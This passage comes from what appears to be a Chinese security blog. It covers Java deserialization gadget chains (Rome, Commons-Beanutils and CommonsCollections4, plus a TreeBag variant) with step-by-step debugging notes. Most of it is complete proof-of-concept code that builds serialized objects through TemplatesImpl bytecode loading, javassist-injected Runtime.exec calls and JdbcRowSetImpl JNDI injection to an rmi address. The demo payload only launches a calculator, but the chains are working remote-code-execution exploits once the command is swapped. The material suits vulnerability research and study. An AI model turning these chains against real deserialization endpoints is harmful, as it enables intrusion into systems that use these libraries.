obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 也是只弹出一个计算机，也是报错：\n1 Exception in thread \u0026#34;main\u0026#34; java.lang.ClassNotFoundException: Evil 这里再想了一下，可能是javassist的原因？或者由于序列化时JVM已经加载了Evil这个类？\n那么同样将其改成只在反序列化时弹出，最后的poc如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 package org.example; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import javax.xml.transform.Templates; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.syndication.feed.impl.ToStringBean; import com.sun.org.apache.xpath.internal.objects.XString; import javassist.*; import java.util.HashMap; import java.util.Hashtable; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { //使用javassist定义恶意代码 ClassPool classPool = ClassPool.getDefault(); classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cc = classPool.makeClass(\u0026#34;Evil\u0026#34;); String cmd= \u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;open -a Calculator\\\u0026#34;);\u0026#34;; cc.makeClassInitializer().insertBefore(cmd); cc.setSuperclass(classPool.get(AbstractTranslet.class.getName())); byte[] classBytes = cc.toBytecode(); byte[][] code = new byte[][]{classBytes}; TemplatesImpl impl = new TemplatesImpl(); setFieldValue(impl,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(impl,\u0026#34;_bytecodes\u0026#34;,code); setFieldValue(impl, \u0026#34;_class\u0026#34;, null); setFieldValue(impl, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); ToStringBean x1 = new ToStringBean(String.class,\u0026#34;fupanc\u0026#34;); XString xString = new XString(\u0026#34;fupanc\u0026#34;); Hashtable hash = new Hashtable(); HashMap hashMap0 = new HashMap(); hashMap0.put(\u0026#34;zZ\u0026#34;,xString); hashMap0.put(\u0026#34;yy\u0026#34;,x1); HashMap hashMap1 = new HashMap(); hashMap1.put(\u0026#34;zZ\u0026#34;,x1); hashMap1.put(\u0026#34;yy\u0026#34;,xString); hash.put(hashMap0,\u0026#34;1\u0026#34;); hash.put(hashMap1,\u0026#34;2\u0026#34;); setFieldValue(x1,\u0026#34;_beanClass\u0026#34;,Templates.class); setFieldValue(x1,\u0026#34;_obj\u0026#34;,impl); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(hash); out.close(); ObjectInputStream in = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); in.readObject(); in.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功只在反序列化时弹出计算机。\nJdbcRowSetImpl fastjson中提到过的类，这个类存在一个connect()方法存在jndi注入漏洞：\n非常好实现jndi注入漏洞，这里的conn变量在类初始化时就会设置为null，会调用到else if中的方法，然后控制getDataSourceName()方法有值即可。并且这个类存在一个getter方法有调用connect()方法的逻辑：\n我们可以知道rome链的那几条链子都可以调用任意类的getter方法，所以直接打就行了，以toString链为例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package org.example; import java.lang.reflect.Field; import javax.management.BadAttributeValueExpException; import com.sun.rowset.JdbcRowSetImpl; import com.sun.syndication.feed.impl.ToStringBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { JdbcRowSetImpl rs = new JdbcRowSetImpl(); rs.setDataSourceName(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); ToStringBean x1 = new ToStringBean(JdbcRowSetImpl.class,rs); setFieldValue(bad,\u0026#34;val\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 常规的jndi打法，注意jdk版本，但是这里运行发现并没有弹出计算机，调试了一下，发现还是和前面提到的报错一样，这里由于有很多的getter方法，在没调用到我们想要调用的前就直接报错退出了：\n可以看到这里调用这个方法后直接抛出异常，解决方法至少有两个：\n像之前那样找一个class类，包含的getter方法少，并且能调用到getDatabaseMetaData()方法 还有就是根据报错，让方法调用不再报错，从而可以调用到我们想要利用的方法。 如果能找到，那么第一种方法是最好打的，但是找了一圈，没看到JdbcRowSetImpl的父类或者接口类有定义getDatabaseMetaData()方法，这个方法应该是JdbcRowSetImpl自带的，所以只能采用第二个方法。\n定位到getMatchColumnNames()方法，可以直接打断点调试：\n也就是让这个有值即可，跟进这个strMatchColumns变量的赋值，在构造方法中：\n这里的Vector类，我们也接触过了，这里就是往往里面放入值：\n跟进再看insertElementAt()方法：\n就是给这个数组类型的变量里面插入值：\n所以前面的操作就是将这个数组类型的变量全部填满，然后都是null类型，但是我们想要不报错，就需要第一个值不为null：\n直接反射获取然后调用类函数修改即可：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 package org.example; import java.lang.reflect.Field; import javax.management.BadAttributeValueExpException; import com.sun.rowset.JdbcRowSetImpl; import com.sun.syndication.feed.impl.ToStringBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.util.Vector; public class Main{ public static void main(String[] args) throws Exception { JdbcRowSetImpl rs = new JdbcRowSetImpl(); rs.setDataSourceName(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); Vector obj = (Vector)getFieldValue(rs, \u0026#34;strMatchColumns\u0026#34;); obj.insertElementAt(\u0026#34;fupanc\u0026#34;,0); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); ToStringBean x1 = new ToStringBean(JdbcRowSetImpl.class,rs); setFieldValue(bad,\u0026#34;val\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } public static Object getFieldValue(Object obj, String fieldName) throws Exception { Class clazz = obj.getClass(); while (clazz != null) { try { Field field = clazz.getDeclaredField(fieldName); field.setAccessible(true); return field.get(obj); } catch (Exception e) { clazz = clazz.getSuperclass(); } } return null; } } 调试发现可以让这个方法就不会扔出异常了，并且这个方法过后就是我们想要利用的getDatabaseMetaData()方法：\n然后再打jndi注入成功弹出计算机。\n后面看了一下网上的分析文章，发现其实JdbcRowSetImpl类自己定义了一个类用来给strMatchColumns变量进行改值：\n跟进set()方法：\n也是一个改值的操作，并且刚好是我们需要改的下标0的值，所以如下打也是可以的：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 package org.example; import java.lang.reflect.Field; import javax.management.BadAttributeValueExpException; import com.sun.rowset.JdbcRowSetImpl; import com.sun.syndication.feed.impl.ToStringBean; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { JdbcRowSetImpl rs = new JdbcRowSetImpl(); rs.setDataSourceName(\u0026#34;rmi://127.0.0.1:1099/Hello\u0026#34;); rs.setMatchColumn(\u0026#34;fupanc\u0026#34;); BadAttributeValueExpException bad = new BadAttributeValueExpException(null); ToStringBean x1 = new ToStringBean(JdbcRowSetImpl.class,rs); setFieldValue(bad,\u0026#34;val\u0026#34;,x1); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(bad); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 更简短的payload。\n参考文章：\nhttps://changeyourway.github.io/2024/06/07/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-Rome%E9%93%BE%E4%B9%8BHotSwappableTargetSource%E9%93%BE/\nhttps://goodapple.top/archives/1145\nhttps://boogipop.com/2024/02/12/%E6%98%93%E6%87%82%E7%9A%84Rome%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%88%E6%9B%B4%E6%96%B0%EF%BC%89/#HotSwappableTargetSource%E5%88%A9%E7%94%A8%E9%93%BE\nhttps://xz.aliyun.com/news/12729\n","date":"2024-08-13T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/rome%E9%93%BE/","title":"Rome链"},{"content":"CB链 环境配置 环境配置 pom.xml添加：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-beanutils\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-beanutils\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.8.3\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-logging\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-logging\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 测试环境 commons-beanutils 1.8.3 commons-logging:commons-logging:1.2 JDK 8u411 commons-collections3.2.1 这里需要3.2.1的原因是后面要利用的BeanComparator要用： 踩了一下坑，这里4是用不了的\n正式学习 Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通java类对象（也称为JavaBean）的一些操作方法。\n而JavaBean是一个遵循特定写法的Java类，它通常具有如下特点：\n这个类必须具有一个无参的构造函数（一般我们没自定义构造函数的话默认的就是无参的构造函数） 属性必须私有化 私有化的属性必须通过public类型的方法暴露给其他程序，并且方法的命名也必须遵守一定的命名规范。 比如如下的Cat类就是一个最简单的JavaBean类：\n1 2 3 4 5 6 7 8 9 10 11 final public class Cat { private String name = \u0026#34;catalina\u0026#34;; public String getName() { return name; } public void setName(String name) { this.name = name; } } 它包含一个私有属性name，和读取和设置这个属性的两个方法，又称为getter和setter。\n需要了解的类 PropertyUtils 它是对JavaBean进行操作的工具类，可单独为某个属性进行值的操作的工具类。它利用反射操作Bean的属性。这个类位于org.apache.commons.beanutils.PropertyUtils。\nPropertyUtils类中提供了一些public的静态方法，以便直接调用一些getter和setter方法：\ngetProperty：返回指定Bean的指定属性的值 getSimpleProperty：返回执行Bean的指定属性的值 setProperty：设置指定Bean的指定属性的值 setSimpleProperty：设置指定Bean的指定属性的值 看一个实例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 package org.example; import org.apache.commons.beanutils.PropertyUtils; public class Main{ private String name; public void setName(String name){ this.name = name; } public String getName(){ return this.name; } public static void main(String[] args) throws Exception { Main x = new Main(); PropertyUtils.setProperty(x,\u0026#34;name\u0026#34;,\u0026#34;fupanc\u0026#34;); System.out.println(x.getName()); x.setName(\u0026#34;haha\u0026#34;); System.out.println(PropertyUtils.getProperty(x,\u0026#34;name\u0026#34;)); } } 输出为：\n1 2 fupanc haha 看这个结果已经很容易知道前面的方法是干嘛的了。注意一下在调用方法时对于参数设置的问题。\n所以这里其实很容易看出，PropertyUtils.getProperty/setProperty方法，参数一定要注意，其实就可以理解为调用对应类变量的getter和setter方法。\nBeanComparator 前面也说过，其实CB链就是cc2的基础上新找了一个调用compare进行利用。在ysoserial中利用到的是BeanComparator类，这个类位于org.apache.commons.beanutils.BeanComparator，我们来看一下他的compare方法： 重点关注：\n前面说过getProperty()方法，在这里那么就会调用o1、o2对象的property变量的getter方法。\n在ysoserial中，CB链利用到了TemplatesImpl类，是通过PropertyUtils.getProperty来调用_outputProperties变量的getter方法，也就是TemplatesImpl的getOutputProperties方法来动态加载字节码，那么现在来看一下getOutputProperties()方法的源码： 这里调用了newTransformer()方法，在这里就可以进行一次恶意动态加载字节码的过程。\n那么在BeanComparator的compare()方法中，我们需要控制o1/o2为TemplatesImpl对象，this.Properties为outputProperties字符串。\n看一下BeanComparator类的构造方法，按照前面的描述，我们这里不需要自定义this.comparator变量，这里我们要利用到的是构造方法是：\n其实也就是下面那个，但是直接使用“默认”的comparator了。\n攻击构造 前面把基本的链给了出来，在这里还是利用的PriorityQueue作为序列化和反序列化的类，反序列化的时候是差不多的，最终到调用compare()方法的地方是：\n现在其实感觉和CC2差不多了。\n构造基本的字节码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 然后其他流程直接当做cc2那里看，现在简单分别分析一下过程。\n反序列化部分 和CC2差不多，PriorityQueue的readObject() =》heapify() =》siftDown() =》siftDownUsingComparator，最终也就是如下： 按照CC2过程来，假如我们add进两个值，那么这里的k为0，x为queue[0]的值，也就是我们第一个add进的值，同时看这个方法的内部，那么再分别说一下值问题：\nhalf：1 child：1 right：2 所以上面的c对应我们前面add进的第二个值，看大小情况可以知道是会进入第二个if条件语句，对应参数分别为（x：queue[0]，c：queue[1]）。\n结合前面对BeanComparator类的compare()方法的描述，可以知道我们这里至少需要一个为设计好了的TemplatesImpl类对象。\n序列化部分 add()有个部分，在第二次add进值的时候： 按照前面的说法，这里会进入BeanComparator的compare()方法，这里的k即是1，x即是我第二次要放入的值，e就是queue[0]，也就是我放入的第一个值。看这里的compare()的值，看参数（x：add2，e：queue[0]），在前面序列化的时候说了，我们需要至少add进一个TemplatesImpl类实例，那么其实在这里同样可以尝试一下构造在序列化时弹出计算机：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bean = new BeanComparator(\u0026#34;outputProperties\u0026#34;); PriorityQueue priority = new PriorityQueue(2,bean); priority.add(1); priority.add(tem); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功按照预期弹出一个计算机。还有就是存在一个和之前一样的问题，当我利用TemplatesImpl来动态加载恶意字节码的时候，如果我add进两个tem，只会弹出一个计算机，在第一个结束后会直接报错结束，并不会进入第二个利用点： 比如CC4等。\n还有一个需要注意的点就是这里add进的顺序也有讲究，比如我像上面代码那样只add进一个，那么我必须保证tem在o1，因为o1/o2必须为一个类实例，按照前面将的参数问题，o1对应add2，也就是我要在第二个地方add进tem，否则会直接报错退出。\n那么我们现在继续关注第二次add后会发生什么： 在前面抛出异常后，不知道调用compare()方法后到底会返回什么，那么我们直接打断点来看会到哪里，发现确实会在抛出异常后直接退出，那么这样我们并不能成功在queue[1]成功设置为tem，从而导致后续都失败。\n在ysoserial中给出了解决方法，我们可以先往里面随便add进值，然后再反射更改为我想利用的，那么测试代码可以改为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bean = new BeanComparator(\u0026#34;outputProperties\u0026#34;); PriorityQueue priority = new PriorityQueue(2,bean); priority.add(1); priority.add(1); Object[] x = new Object[]{1,tem}; Field field1 = PriorityQueue.class.getDeclaredField(\u0026#34;queue\u0026#34;); field1.setAccessible(true); field1.set(priority,x); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 然后这里报错了我们上面说的问题，PropertyUtils的getProperty的方法第一个参数需要为类实例，但是我们这里传入的都是整数，所以在第二次add后会报错。\n解决方法，在BeanComparator的compare()方法中： 这里只要满足property为null，就不会再调用getProperty()方法，而是正常的compare方法来比较。\n所以我们这里可以使得property先为null，而后再反射修改这个值为outputProperties。\n那么POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bean = new BeanComparator(); PriorityQueue priority = new PriorityQueue(2,bean); priority.add(1); priority.add(1); //错误点 Object[] x = new Object[]{1,tem}; Field field1 = PriorityQueue.class.getDeclaredField(\u0026#34;queue\u0026#34;); field1.setAccessible(true); field1.set(priority,x); String name = \u0026#34;outputProperties\u0026#34;; Field field2 = BeanComparator.class.getDeclaredField(\u0026#34;property\u0026#34;); field2.setAccessible(true); field2.set(bean,name); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 继续报错\n然后思考，这里逻辑明明没有问题，但是为啥还是弹这个问题，然后我尝试修改为传入两个tem，成功弹出计算机，然后再仔细比对一下，找出问题所在，问题处在前面的POC标出来了，感兴趣的可以先自己想想。\n我前面的POC构造是按照序列化前的add()部分构造的，其中的顺序需要为：\nadd1为其他，必须add2为tem。\n但是在反序列化过程中\n注意前面分析时给出的结果，在反序列时调用到BeanComparator的compare()方法时的参数分别为**（x：queue[0]，c：queue[1]）**。\n所以这里是先调用的queue[0]，同时结合我们前面的说法，只会调用一次，所以我们这里需要，如下设置：\n1 Object[] x = new Object[]{tem,1}; 那么最终的POC为：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 package org.example; import org.apache.commons.beanutils.BeanComparator; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.lang.reflect.Field; import java.nio.file.Files; import java.nio.file.Paths; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl tem = new TemplatesImpl(); setFieldValue(tem,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(tem,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(tem, \u0026#34;_class\u0026#34;, null); setFieldValue(tem, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); BeanComparator bean = new BeanComparator(); PriorityQueue priority = new PriorityQueue(2,bean); priority.add(1); priority.add(1); Object[] x = new Object[]{tem,1}; Field field1 = PriorityQueue.class.getDeclaredField(\u0026#34;queue\u0026#34;); field1.setAccessible(true); field1.set(priority,x); String name = \u0026#34;outputProperties\u0026#34;; Field field2 = BeanComparator.class.getDeclaredField(\u0026#34;property\u0026#34;); field2.setAccessible(true); field2.set(bean,name); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 成功按照预期弹出一个计算机。\n","date":"2024-08-07T22:53:06+08:00","permalink":"https://fupanc-w1n.github.io/p/cb%E9%93%BE/","title":"CB链"},{"content":"CC4 ysoserial链中的CC4就只是将CC2使用的InvokerTransformer替换为InstantiateTransformer来加载字节码，具体使用CC3那里已经说过了。\n测试环境：\nJDK 8U411 commons-collections4.0 不多说，给个POC结束：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 package org.example; import java.util.PriorityQueue; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.InstantiateTransformer; import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter; import javax.xml.transform.Templates; import java.lang.reflect.Field; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import java.io.FileOutputStream; import java.io.FileInputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.nio.file.Files; import java.nio.file.Paths; public class Main{ public static void main(String[] args) throws Exception { byte[] code = Files.readAllBytes(Paths.get(\u0026#34;D:\\\\maven_text\\\\maven1_text\\\\target\\\\test-classes\\\\org\\\\example\\\\Test.class\u0026#34;)); TemplatesImpl ctf = new TemplatesImpl(); setFieldValue(ctf,\u0026#34;_name\u0026#34;,\u0026#34;fupanc\u0026#34;); setFieldValue(ctf,\u0026#34;_bytecodes\u0026#34;,new byte[][]{code}); setFieldValue(ctf, \u0026#34;_class\u0026#34;, null); setFieldValue(ctf, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformer = new Transformer[]{new ConstantTransformer(1)}; Transformer[] chainPart = new Transformer[]{new ConstantTransformer(TrAXFilter.class),new InstantiateTransformer(new Class[]{Templates.class},new Object[]{ctf})}; Transformer chain = new ChainedTransformer(fakeTransformer); TransformingComparator comparator1 = new TransformingComparator(chain); PriorityQueue priority = new PriorityQueue(2,comparator1); priority.add(1); priority.add(1); Field field1 = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); field1.setAccessible(true); field1.set(chain,chainPart); ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(priority); out.close(); ObjectInputStream input = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); input.readObject(); input.close(); } public static void setFieldValue(Object obj,String fieldName,Object value) throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj,value); } } 有点小怪的就是之弹出一个计算机，按照预期应该是两个的，调试器也有点小问题。\n补充 测试环境：\nJDK 8U411 commons-collections4.0 这里补充一个对PriorityQueue的替代链 TreeBag。\n直接上对类的分析\nTreeBag\u0026amp;TreeMap 在 CC2 中，使用了优先级队列 PriorityQueue 反序列化时会调用 comparator 的 compare 方法的特性，配合 TransformingComparator 触发 transformer。\n在这里TreeBag也实现了在反序列化时会调用到比较器，所以这里也可以利用。\nTreeBag类位于org.apache.commons.collections4.bag.TreeBag\n稍微说明一下Bag：\nBag 接口继承自 Collection 接口，定义了一个集合，该集合会记录对象在集合中出现的次数。它有一个子接口 SortedBag，定义了一种可以对其唯一不重复成员排序的 Bag 类型。\nTreeBag 是对 SortedBag 的一个标准实现。TreeBag 使用 TreeMap 来储存数据，并使用指定 Comparator 来进行排序。\n————\nTreeBag 类继承自 AbstractMapBag，实现了 SortedBag 接口。初始化 TreeBag 时，会创建一个新的 TreeMap 储存在AbstractMapBag的成员变量 map 里，而排序使用的 Comparator 则直接储存在 TreeMap 中：\nTreeBag类构造方法：\n父类AbstractMapBag：\nTreeMap定义有comparator：\n当对TreeBag反序时： 可以看出这里会读取TreeMap的comparator并调用父类AbstractMapBag的doReadObject()方法： 这里会调用map.put()，也就是TreeMap的put方法： 看我标重点部分，在前面的简单过程中，这里会进入if条件很正常（并且利用点就是这里，至于为什么后面再说明），这里就会执行compare方法，看一下TreeMap类的compare()方法： 只要我们正确定义了comparator就可以成功执行漏洞。\n链子不就出来了吗。\n两个点需要说明 第一个 1.父类AbstractMapBag的变量map不可被序列化：\n解决方法同样是在TreeBag的writeObject()以及readObject()方法中： writeObject()： 继续跟进this.comparator()： 然后到会到父类AbstractMapBag的getMap()方法： 返回了我们定义的TreeMap实例，所以前面的comparator()中会调用TreeMap类的comparator()： 直接返回了我们定义的comparator。所以序列化的时候会序列化我们定义的comparator：\n——\n那么看反序列化： 